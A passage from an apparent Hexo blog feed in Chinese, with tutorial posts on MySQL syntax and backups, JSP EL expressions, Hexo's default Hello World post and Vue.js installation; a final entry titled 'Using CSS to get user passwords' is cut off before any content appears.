title="长度区别"></a>长度区别</h5><p>int类型带长度：不影响存取值，即使设定的值超出了长度的范畴，也能存，如果没有达到设定的长度，则使用空格自动填充到设定的长度<br>char类型：不可变字符，设定的长度就是规定当前字段能存的数据的最大长度，若超出长度，则会报错，若没有达到长度，使用空格填充到设定的长度<br>varchar：可变字符，设定的长度同样是规定当前字段能存的数据的最大长度，若超出长度，则会报错，若没有达到长度，不会使用空格填充，实际多长就是多长</p><h5 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h5><pre><code class="mysql">DROP TABLE 表名;</code></pre><h5 id="表约束"><a href="#表约束" class="headerlink" title="表约束"></a>表约束</h5><p>1.非空约束    NOT NULL</p><p>2.默认值约束  DEFAULT ‘男’</p><p>3.唯一约束    UNIQUE4.主键约束    PRIMARY KEY</p><h5 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h5><p>DESC 表名</p><h5 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h5><h5 id="修改列名"><a href="#修改列名" class="headerlink" title="修改列名"></a>修改列名</h5><pre><code class="mysql">Alter table 表名  change  列名  新列名 类型;</code></pre><h5 id="修改列类型"><a href="#修改列类型" class="headerlink" title="修改列类型"></a>修改列类型</h5><pre><code class="mysql">Alter table 表名  change 列名  列名  新类型;</code></pre><h5 id="修改列类型-1"><a href="#修改列类型-1" class="headerlink" title="修改列类型"></a>修改列类型</h5><pre><code class="mysql">Alter table 表名  modify  列名  新类型;</code></pre><h5 id="数据查询-单表"><a href="#数据查询-单表" class="headerlink" title="==============================数据查询-单表================================="></a>==============================数据查询-单表=================================</h5><h5 id="查询表中全部信息"><a href="#查询表中全部信息" class="headerlink" title="查询表中全部信息"></a>查询表中全部信息</h5><pre><code class="mysql">select * from 表名;</code></pre><h5 id="查询表中指定列的信息"><a href="#查询表中指定列的信息" class="headerlink" title="查询表中指定列的信息"></a>查询表中指定列的信息</h5><pre><code class="mysql">select 列1,列2 from 表名;</code></pre><p>语句的执行顺序：from—&gt;select</p><h5 id="数据去重"><a href="#数据去重" class="headerlink" title="数据去重"></a>数据去重</h5><pre><code class="mysql">select distinct 列…. From 表名;</code></pre><h5 id="拼接结果"><a href="#拼接结果" class="headerlink" title="拼接结果"></a>拼接结果</h5><pre><code class="mysql">select concat(列1,列2) from 表名;</code></pre><h5 id="运算符优先级："><a href="#运算符优先级：" class="headerlink" title="运算符优先级："></a>运算符优先级：</h5><p>1.乘法和除法的优先级高于加法和减法<br>2.同级运算的顺序是从左到右<br>3.表达式中使用”括号”可强行改变优先级的运算顺序</p><pre><code class="mysql">select 列1[+-*/]列2 from 表名;</code></pre><h5 id="设置别名-注意：关键字as可以省略"><a href="#设置别名-注意：关键字as可以省略" class="headerlink" title="设置别名(注意：关键字as可以省略)"></a>设置别名(注意：关键字as可以省略)</h5><pre><code class="mysql">select 列 as 别名 from 表名;  select 列 别名 from 表名;     </code></pre><p> 语句的执行顺序：from—&gt;select</p><h5 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h5><pre><code class="mysql">select 列… from 表名 where 条件;  </code></pre><h5 id="条件中比较运算符：-等于-大于-gt-大于等于-gt-小于-lt-小于等于-lt-不等于-或-lt-gt"><a href="#条件中比较运算符：-等于-大于-gt-大于等于-gt-小于-lt-小于等于-lt-不等于-或-lt-gt" class="headerlink" title="条件中比较运算符：( 等于:=  大于:&gt;  大于等于:&gt;=  小于:&lt;  小于等于:&lt;=  不等于:!= 或 &lt;&gt;  )"></a>条件中比较运算符：( 等于:=  大于:&gt;  大于等于:&gt;=  小于:&lt;  小于等于:&lt;=  不等于:!= 或 &lt;&gt;  )</h5><pre><code class="mysql">where 列  比较运算符  值;</code></pre><p>注意:字符串、日期需使用单引号括起来<br>语句的执行顺序：from—&gt;where—&gt;select</p><h5 id="逻辑运算符-并且-and-或-amp-amp-或-or-非-not-或"><a href="#逻辑运算符-并且-and-或-amp-amp-或-or-非-not-或" class="headerlink" title="逻辑运算符( 并且:and 或 &amp;&amp;   或:or    非:not 或 !    )"></a>逻辑运算符( 并且:and 或 &amp;&amp;   或:or    非:not 或 !    )</h5><pre><code class="mysql">where 条件1  逻辑运算符  条件2;  where not 条件; </code></pre><h5 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h5><pre><code class="mysql">where 列 between 条件1  and 条件2;        </code></pre><p>//列在这个区间的值where 列 not between 条件1 and 条件2;    </p><p>//不在这个区间where !( 列 between 条件1 and 条件2 );    </p><p>//同样表示不在这个区间</p><h5 id="集合查询-判断列的值是否在指定的集合中"><a href="#集合查询-判断列的值是否在指定的集合中" class="headerlink" title="集合查询( 判断列的值是否在指定的集合中 )"></a>集合查询( 判断列的值是否在指定的集合中 )</h5><pre><code class="mysql">where 列 in(值1,值2);      </code></pre><p>//列中的数据是in后的值里面的where 列 not in(值1,值2);   </p><p>//不是in中指定值的数据</p><h5 id="NULL值查询-注意：列中值为null不能使用-去查询"><a href="#NULL值查询-注意：列中值为null不能使用-去查询" class="headerlink" title="NULL值查询( 注意：列中值为null不能使用=去查询 )"></a>NULL值查询( 注意：列中值为null不能使用=去查询 )</h5><pre><code class="mysql">where 列 is null;  </code></pre><p>//查询列中值为null的数据</p><h5 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h5><h5 id="：表示0到多个字符，示例："><a href="#：表示0到多个字符，示例：" class="headerlink" title="%：表示0到多个字符，示例："></a>%：表示0到多个字符，示例：</h5><pre><code class="mysql">where 列 like &#39;%0&#39;;  </code></pre><p> //表示以0结尾where 列 like  ‘0%’;   </p><p>//表示以0开头where 列 like  ‘%0%’;  </p><p> //表示数据中包含0</p><h5 id="：表示一个字符，可多次使用，示例："><a href="#：表示一个字符，可多次使用，示例：" class="headerlink" title="_：表示一个字符，可多次使用，示例："></a>_：表示一个字符，可多次使用，示例：</h5><pre><code class="mysql">where 列 like &#39;%0_&#39;;   </code></pre><p>//数据结尾第二位是0</p><h5 id="结果排序-对查询出的结果按照一列或多列进行升序还是降序排列-升序-asc-降序-desc-注意：不能使用中文的别名排序"><a href="#结果排序-对查询出的结果按照一列或多列进行升序还是降序排列-升序-asc-降序-desc-注意：不能使用中文的别名排序" class="headerlink" title="结果排序( 对查询出的结果按照一列或多列进行升序还是降序排列 升序:asc  降序:desc    注意：不能使用中文的别名排序)"></a>结果排序( 对查询出的结果按照一列或多列进行升序还是降序排列 升序:asc  降序:desc    注意：不能使用中文的别名排序)</h5><pre><code class="mysql">where 条件 order by 列 [asc/desc]</code></pre><p>语句的执行顺序：from—&gt;where—&gt;select—&gt;order by</p><h5 id="分页查询-beginIndex-表示从第多少条数据开始-pageSize-表示每页显示的数据条数"><a href="#分页查询-beginIndex-表示从第多少条数据开始-pageSize-表示每页显示的数据条数" class="headerlink" title="分页查询( beginIndex:表示从第多少条数据开始   pageSize:表示每页显示的数据条数 )"></a>分页查询( beginIndex:表示从第多少条数据开始   pageSize:表示每页显示的数据条数 )</h5><pre><code class="mysql">where [条件] limit beginIndex,pageSize;</code></pre><p>ex：每页显示3条数据<br>第一页: SELECT * FROM 表名 LIMIT 0,3    –0,1,2<br>第二页: SELECT * FROM 表名 LIMIT 3,3    –3,4,5<br>第三页: SELECT * FROM 表名 LIMIT 6,3    –6,7,8<br>第四页: SELECT * FROM 表名 LIMIT 9,3    –9,10,11<br>  ……<br>第七页: SELECT * FROM 表名 LIMIT 18,3   –18,19,20</p><h5 id="beginIndex公式：-当前页数-1-pageSize"><a href="#beginIndex公式：-当前页数-1-pageSize" class="headerlink" title="beginIndex公式：(当前页数-1)*pageSize"></a>beginIndex公式：(当前页数-1)*pageSize</h5><h5 id="聚集函数-作用于一组数据，并对一组数据返回一个值"><a href="#聚集函数-作用于一组数据，并对一组数据返回一个值" class="headerlink" title="聚集函数( 作用于一组数据，并对一组数据返回一个值 )"></a>聚集函数( 作用于一组数据，并对一组数据返回一个值 )</h5><h5 id="COUNT-统计结果记录数，若统计的是列，列中为Null，那么count将不会计算值"><a href="#COUNT-统计结果记录数，若统计的是列，列中为Null，那么count将不会计算值" class="headerlink" title="COUNT:统计结果记录数，若统计的是列，列中为Null，那么count将不会计算值"></a>COUNT:统计结果记录数，若统计的是列，列中为Null，那么count将不会计算值</h5><h5 id="MAX-统计计算最大值"><a href="#MAX-统计计算最大值" class="headerlink" title="MAX:  统计计算最大值"></a>MAX:  统计计算最大值</h5><h5 id="MIN-统计计算最小值"><a href="#MIN-统计计算最小值" class="headerlink" title="MIN:  统计计算最小值"></a>MIN:  统计计算最小值</h5><h5 id="SUM-统计计算求和"><a href="#SUM-统计计算求和" class="headerlink" title="SUM:  统计计算求和"></a>SUM:  统计计算求和</h5><h5 id="AVG-统计计算平均值"><a href="#AVG-统计计算平均值" class="headerlink" title="AVG:  统计计算平均值"></a>AVG:  统计计算平均值</h5><h5 id="分组函数-注意：如果要对分组后的数据进行筛选，那么必须使用having关键字，条件写在having后"><a href="#分组函数-注意：如果要对分组后的数据进行筛选，那么必须使用having关键字，条件写在having后" class="headerlink" title="分组函数( 注意：如果要对分组后的数据进行筛选，那么必须使用having关键字，条件写在having后 )"></a>分组函数( 注意：如果要对分组后的数据进行筛选，那么必须使用having关键字，条件写在having后 )</h5><pre><code class="mysql">select 聚集函数 from 表名 where [条件] group by 列 having 分组后的条件</code></pre><p>语句的执行顺序：FROM—&gt; WHERE—&gt;group by—-&gt;Having—&gt;SELECT–&gt;ORDER BY</p><h5 id="Where和having的区别："><a href="#Where和having的区别：" class="headerlink" title="Where和having的区别："></a>Where和having的区别：</h5><h5 id="Where-先过滤已有的数据-数据是已经存在的-在进行分组-在聚集计算"><a href="#Where-先过滤已有的数据-数据是已经存在的-在进行分组-在聚集计算" class="headerlink" title="Where: 先过滤已有的数据(数据是已经存在的),在进行分组,在聚集计算"></a>Where: 先过滤已有的数据(数据是已经存在的),在进行分组,在聚集计算</h5><h5 id="Having-先分组-在对每组进行计算-根据得到结果在过滤-分组把数据算出之后，在过滤"><a href="#Having-先分组-在对每组进行计算-根据得到结果在过滤-分组把数据算出之后，在过滤" class="headerlink" title="Having:先分组,在对每组进行计算,根据得到结果在过滤(分组把数据算出之后，在过滤)"></a>Having:先分组,在对每组进行计算,根据得到结果在过滤(分组把数据算出之后，在过滤)</h5><p>注意：使用having的时候，它是可以使用别名的</p><h5 id="数据查询-多表"><a href="#数据查询-多表" class="headerlink" title="===============================数据查询-多表==============================="></a>===============================数据查询-多表===============================</h5><h5 id="交叉连接-又名笛卡尔积，使用交叉连接会产生笛卡尔积"><a href="#交叉连接-又名笛卡尔积，使用交叉连接会产生笛卡尔积" class="headerlink" title="交叉连接:又名笛卡尔积，使用交叉连接会产生笛卡尔积"></a>交叉连接:又名笛卡尔积，使用交叉连接会产生笛卡尔积</h5><p>假设集合A={a, b}，集合B={0, 1, 2}，则两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。</p><pre><code class="mysql">select *  from 表1,表2</code></pre><h5 id="内连接：过滤为空的数据-查询的实际上是两张表数据的交集部分-目的-》解决笛卡尔积现象，正确查询了需要的数据"><a href="#内连接：过滤为空的数据-查询的实际上是两张表数据的交集部分-目的-》解决笛卡尔积现象，正确查询了需要的数据" class="headerlink" title="内连接：过滤为空的数据(查询的实际上是两张表数据的交集部分)    目的 ==》解决笛卡尔积现象，正确查询了需要的数据"></a>内连接：过滤为空的数据(查询的实际上是两张表数据的交集部分)    目的 ==》解决笛卡尔积现象，正确查询了需要的数据</h5><pre><code class="mysql">select * from 表1,表2  where 表1.字段=表2.字段;  </code></pre><p>//隐式内连接,使用where条件消除笛卡尔积</p><pre><code class="mysql">select * from 表1 [inner] join 表2 on 表1.字段=表2.字段;</code></pre><p> //显式内连接,如果是多张表，则一直在join..on后依次添加join..on即可,inner关键字可被省略</p><h5 id="外连接：左外连接、右外连接、全外连接"><a href="#外连接：左外连接、右外连接、全外连接" class="headerlink" title="外连接：左外连接、右外连接、全外连接"></a>外连接：左外连接、右外连接、全外连接</h5><h5 id="左外连接-以左边表为主，返回左边表中所有数据，若右表中无数据，则显示为NULL，请参考实际查询结果来理解"><a href="#左外连接-以左边表为主，返回左边表中所有数据，若右表中无数据，则显示为NULL，请参考实际查询结果来理解" class="headerlink" title="左外连接:以左边表为主，返回左边表中所有数据，若右表中无数据，则显示为NULL，请参考实际查询结果来理解"></a>左外连接:以左边表为主，返回左边表中所有数据，若右表中无数据，则显示为NULL，请参考实际查询结果来理解</h5><pre><code class="mysql">select * from 表1 left [outer] join 表2 on 表1.字段=表2.字段;   </code></pre><p>//表1为左表，表2为右表,outer关键字可被省略</p><h5 id="右外连接：以右边表为主，返回右表中所有数据，若左表中无数据，则显示为NULL，结合实际查询结果来理解"><a href="#右外连接：以右边表为主，返回右表中所有数据，若左表中无数据，则显示为NULL，结合实际查询结果来理解" class="headerlink" title="右外连接：以右边表为主，返回右表中所有数据，若左表中无数据，则显示为NULL，结合实际查询结果来理解"></a>右外连接：以右边表为主，返回右表中所有数据，若左表中无数据，则显示为NULL，结合实际查询结果来理解</h5><pre><code class="mysql">select * from 表1 right [outer] join 表2 on 表1.字段=表2.字段;  </code></pre><p>//表1为左表，表2为右表,outer关键字可被省略</p><h5 id="全外连接：返回涉及的多表中的所有数据，MYSQL中不支持该查询，仅限了解自连接：单表当作多表查询，直白的讲就是一张表中数据含有多种关系，使用多表查询的语法，来查询一张表，查询过程中一定要使用别名"><a href="#全外连接：返回涉及的多表中的所有数据，MYSQL中不支持该查询，仅限了解自连接：单表当作多表查询，直白的讲就是一张表中数据含有多种关系，使用多表查询的语法，来查询一张表，查询过程中一定要使用别名" class="headerlink" title="全外连接：返回涉及的多表中的所有数据，MYSQL中不支持该查询，仅限了解自连接：单表当作多表查询，直白的讲就是一张表中数据含有多种关系，使用多表查询的语法，来查询一张表，查询过程中一定要使用别名"></a>全外连接：返回涉及的多表中的所有数据，MYSQL中不支持该查询，仅限了解自连接：单表当作多表查询，直白的讲就是一张表中数据含有多种关系，使用多表查询的语法，来查询一张表，查询过程中一定要使用别名</h5><p>多用在分类数据、省市县分类数据、权限…</p><pre><code class="mysql">select 表1.字段1,表2.字段2 from 表名 as 表1,表名 as 表2 where 表1.字段1=表2.字段2 </code></pre><h5 id="子查询：将一个查询结果作为另一个查询的对象，直白的讲就是SQL语句嵌套"><a href="#子查询：将一个查询结果作为另一个查询的对象，直白的讲就是SQL语句嵌套" class="headerlink" title="子查询：将一个查询结果作为另一个查询的对象，直白的讲就是SQL语句嵌套"></a>子查询：将一个查询结果作为另一个查询的对象，直白的讲就是SQL语句嵌套</h5><pre><code class="mysql">select * from (select * from 表名) as 别名select * from where 条件</code></pre><p>//条件中包含查询语句</p><p>注意：1.查询结果的虚拟表必须取别名<br>           2.字段与关键字一样，冲突时，需要给字段名加``,(Esc键下面、1的左边)<br>           3.如果给虚拟结果表中的字段取了别名，则对虚拟结果表查询时，应该用 表别名.虚拟表字段别名</p><h5 id="插入数据"><a href="#插入数据" class="headerlink" title="===============================插入数据==============================="></a>===============================插入数据===============================</h5><pre><code class="mysql">insert into 表名(字段1,字段2..) values(值1,值2…);   </code></pre><p>注意： 1.如果插入的表中的主键是自增类型的，可以不用插入值<br>            2.如果主键是非自增 ，插入的数据则是填补主键字段值空余的值<br>            3.如果主键设置了自动递增，会从主键字段最大值开始插入数据</p><h5 id="其他插入方式："><a href="#其他插入方式：" class="headerlink" title="其他插入方式："></a>其他插入方式：</h5><pre><code class="mysql">insert into 表名(字段1,字段2) values(值1,值2),(值1,值2);    </code></pre><p>//插入多条数据【MYSQL】insert into 表名 values(值1,值2);                    </p><p>//针对全表所有字段进行插入操作insert into 表名(字段) select 字段 from 表2;         </p><p>//查询结果插入insert into 表名 select 字段 from 表2;               </p><p>//查询结果，全表插入</p><h5 id="修改数据"><a href="#修改数据" class="headerlink" title="===============================修改数据==============================="></a>===============================修改数据===============================</h5><pre><code class="mysql">update 表 set 字段=值 where 条件; </code></pre><p> //带条件修改指定数据，否则修改全表</p><h5 id="删除数据"><a href="#删除数据" class="headerlink" title="===============================删除数据==============================="></a>===============================删除数据===============================</h5><pre><code class="mysql">delete from 表 where 条件; </code></pre><p>//删除数据带条件指定数据，否则删除全表数据</p><h5 id="数据备份"><a href="#数据备份" class="headerlink" title="===============================数据备份==============================="></a>===============================数据备份===============================</h5><h5 id="在命令行窗口进行，若操作系统版本高，则使用管理员模式"><a href="#在命令行窗口进行，若操作系统版本高，则使用管理员模式" class="headerlink" title="在命令行窗口进行，若操作系统版本高，则使用管理员模式"></a>在命令行窗口进行，若操作系统版本高，则使用管理员模式</h5><p>导出：</p><p>mysqldump -u账户 -p密码 数据库名称&gt;脚本文件存储地</p><p>ex:         mysqldump -uroot -proot jdbcdemo&gt; C:/shop_bak.sql<br>导入：</p><p>mysql -u账户 -p密码 数据库名称&lt; 脚本文件存储地址</p><p>ex:         mysql -uroot -proot jdbcdemo&lt; C:/shop_bak.sql<br>使用可视化导入导出：<br>Navicat工具的导入和导出/Navicat工具的备份和还原</p><h5 id="数据索引"><a href="#数据索引" class="headerlink" title="===============================数据索引==============================="></a>===============================数据索引===============================</h5><h5 id="索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。"><a href="#索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。" class="headerlink" title="索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。"></a>索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。</h5><h5 id="什么列适合建索引？？"><a href="#什么列适合建索引？？" class="headerlink" title="什么列适合建索引？？"></a>什么列适合建索引？？</h5><p>1.表的主键、外键必须有索引；<br>2.数据量超过30000的表应该有索引；<br>3.经常与其他表进行连接的表，在连接字段上应该建立索引；<br>4.经常出现在Where子句中的字段，特别是大表的字段，应该建立索引；<br>5.索引应该建在选择性高的字段上；<br>6.索引应该建在小字段上，对于大的文本字段甚至超长字段，不要建索引； </p><h5 id="sql语句创建和删除索引："><a href="#sql语句创建和删除索引：" class="headerlink" title="sql语句创建和删除索引："></a>sql语句创建和删除索引：</h5><p>创建索引: </p><p>CREATE INDEX 索引名称 ON 表名 (列名)</p><p>删除索引:<br>方式一：</p><p>DROP INDEX 索引名 ON 表名 </p><p>方式二:  </p><p>ALTER TABLE 表名 DROP INDEX 索引名</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>EL表达式</title>
    <link href="undefined2020/03/02/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>2020/03/02/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h5 id="1-el表达式-Expression-Language）"><a href="#1-el表达式-Expression-Language）" class="headerlink" title="1.el表达式(Expression Language）"></a>1.el表达式(Expression Language）</h5><p>   el表达式：是为了使JSP写起来更加简单;</p><p>以MVC模式设计程序,JSP只是<a href="https://baike.baidu.com/item/%E8%A7%86%E5%9B%BE/1302820" target="_blank" rel="noopener">视图</a>，视图的任务就是显示响应，而不是在JSP中做任何关于程序控制和业务逻辑的事情。所以在JSP页面中应该尽可能少的、或者是完全不出现Java代码。</p><h5 id="2-EL语法"><a href="#2-EL语法" class="headerlink" title="2.EL语法"></a>2.EL语法</h5><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以“${}”表示。</p><h5 id="3-与-运算符"><a href="#3-与-运算符" class="headerlink" title="3.[ ]与.运算符"></a>3.[ ]与.运算符</h5><p>EL 提供“.“和“[ ]“两种运算符来存取数据。</p><p>当要存取的属性名称中包含一些特殊字符，如 . 或 - 等并非字母或数字的符号，就一定要使用“[ ]“。例如：</p><p>${ user. My-Name}应当改为${user[“My-Name”]}</p><p>如果要动态取值时，就可以用“[ ]“来做，而“.“无法做到动态取值。例如：</p><p>${sessionScope.user[data]}中data 是一个变量</p><h5 id="4-变量"><a href="#4-变量" class="headerlink" title="4.变量"></a>4.变量</h5><p>EL存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。</p><p>因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。</p><p>代码：</p><pre><code class="jsp">&lt;%@page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@page import=&quot;java.util.ArrayList&quot;%&gt;&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;    pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Insert title here&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;%--用el表达式完成运算 --%&gt;    ${123+124}    ${123*124}    ${5&gt;18}    ${5&gt;3&amp;&amp;3&gt;5}    ${15&gt;12 and 13&lt;14}    ${12&lt;11 or 11&gt;8}    ${5!=3}    &lt;%--empty运算符的使用 --%&gt;    &lt;%       String str=null;    %&gt;    ${empty str}    ${not empty str}    &lt;%--用el表达式获取域对象的数据--%&gt;    &lt;%      request.setAttribute(&quot;ell&quot;, &quot;good night&quot;);      String ell=(String)request.getAttribute(&quot;ell&quot;);      out.write(ell);    %&gt;     ${ell}    &lt;%--会从四个域对象中，一个一个找ell属性          先找 pageContext是否有ell属性，如果有就停止查找    直接输出ell属性对应的内容。如果没有继续查找request    对象中是否有ell属性，以此类推，直到查找到为止--%&gt;    ${requestScope.ell}    &lt;%--以上是只查找request对象的属性 --%&gt;     ${sessionScope.ell}    ${applicationScope.ell}    &lt;%--el表达式获取集合数组中的数据--%&gt;    &lt;%      ArrayList&lt;String&gt; list=new ArrayList&lt;String&gt;();      list.add(&quot;abc&quot;);      list.add(&quot;bbb&quot;);      list.add(&quot;ccc&quot;);      HashMap&lt;String,String&gt; map=new HashMap&lt;String,String&gt;();      map.put(&quot;aa&quot;, &quot;moring&quot;);      map.put(&quot;bb&quot;,&quot;afternoon&quot;);      map.put(&quot;cc&quot;,&quot;night&quot;);      request.setAttribute(&quot;list1&quot;, list);      request.setAttribute(&quot;map1&quot;, map);    %&gt;    ${requestScope.list1[1]}    ${map1.bb}&lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="undefined2020/03/02/hello-world/"/>
    <url>2020/03/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JSP Cookie 处理</title>
    <link href="undefined2019/12/03/Vue.js%20%E5%AE%89%E8%A3%85/"/>
    <url>2019/12/03/Vue.js%20%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="Vue-js-安装"><a href="#Vue-js-安装" class="headerlink" title="Vue.js 安装"></a>Vue.js 安装</h1><h2 id="1、独立版本"><a href="#1、独立版本" class="headerlink" title="1、独立版本"></a>1、独立版本</h2><p>我们可以在 Vue.js 的官网上直接下载 vue.min.js 并用 **** 标签引入。</p><p><a href="https://vuejs.org/js/vue.min.js" target="_blank" rel="noopener">下载 Vue.js</a> </p><hr><h2 id="2、使用-CDN-方法"><a href="#2、使用-CDN-方法" class="headerlink" title="2、使用 CDN 方法"></a>2、使用 CDN 方法</h2><p>以下推荐国外比较稳定的两个 CDN，国内还没发现哪一家比较好，目前还是建议下载到本地。</p><ul><li><strong>Staticfile CDN（国内）</strong> : <a href="https://cdn.staticfile.org/vue/2.2.2/vue.min.js" target="_blank" rel="noopener">https://cdn.staticfile.org/vue/2.2.2/vue.min.js</a></li><li><strong>unpkg</strong>：<a href="https://unpkg.com/vue/dist/vue.js" target="_blank" rel="noopener">https://unpkg.com/vue/dist/vue.js</a>, 会保持和 npm 发布的最新的版本一致。</li><li><strong>cdnjs</strong> : <a href="https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js" target="_blank" rel="noopener">https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js</a></li></ul><h2 id="Staticfile-CDN（国内）"><a href="#Staticfile-CDN（国内）" class="headerlink" title="Staticfile CDN（国内）"></a>Staticfile CDN（国内）</h2><div id="app">   <p></p> </div><h2 id="unpkg（推荐）"><a href="#unpkg（推荐）" class="headerlink" title="unpkg（推荐）"></a>unpkg（推荐）</h2><div id="app">   <p></p> </div><h2 id="cdnjs"><a href="#cdnjs" class="headerlink" title="cdnjs"></a>cdnjs</h2><div id="app">   <p></p> </div><hr><h2 id="3、NPM-方法"><a href="#3、NPM-方法" class="headerlink" title="3、NPM 方法"></a>3、NPM 方法</h2><p>由于 npm 安装速度慢，本教程使用了淘宝的镜像及其命令 cnpm，安装使用介绍参照：<a href="">使用淘宝 NPM 镜像</a>。</p><p>npm 版本需要大于 3.0，如果低于此版本需要升级它：</p><pre><code># 查看版本$ npm -v2.3.0#升级 npmcnpm install npm -g# 升级或安装 cnpmnpm install cnpm -g</code></pre><p>在用 Vue.js 构建大型应用时推荐使用 NPM 安装：</p><pre><code># 最新稳定版$ cnpm install vue</code></pre><hr><h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h2><p>Vue.js 提供一个官方命令行工具，可用于快速搭建大型单页应用。</p><pre><code># 全局安装 vue-cli$ cnpm install --global vue-cli# 创建一个基于 webpack 模板的新项目$ vue init webpack my-project# 这里需要进行一些配置，默认回车即可This will install Vue 2.x version of the template.For Vue 1.x use: vue init webpack#1.0 my-project? Project name my-project? Project description A Vue.js project? Author runoob &lt;test@runoob.com&gt;? Vue build standalone? Use ESLint to lint your code? Yes? Pick an ESLint preset Standard? Setup unit tests with Karma + Mocha? Yes? Setup e2e tests with Nightwatch? Yes   vue-cli · Generated &quot;my-project&quot;.   To get started:     cd my-project     npm install     npm run dev   Documentation can be found at https://vuejs-templates.github.io/webpack</code></pre><p>进入项目，安装并运行： </p><pre><code>$ cd my-project$ cnpm install$ cnpm run dev DONE  Compiled successfully in 4388ms&gt; Listening at http://localhost:8080</code></pre><p>成功执行以上命令后访问 <a href="http://localhost:8080/，输出结果如下所示：" target="_blank" rel="noopener">http://localhost:8080/，输出结果如下所示：</a></p><p><img src="https:////www.runoob.com/wp-content/uploads/2017/01/56219E04-D156-43EC-AC59-BFE7E38A62C3.jpg" srcset="undefined" alt="img"></p><blockquote><p><strong>注意：</strong>Vue.js 不支持 IE8 及其以下 IE 版本。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用Css获取用户密码</title>
    <link href="undefined2019/12/02/%E4%BD%BF%E7%94%A8Css%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/"/>
    <url>2019/12/02/%E4%BD%BF%E7%94%A8Css%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</url>
    
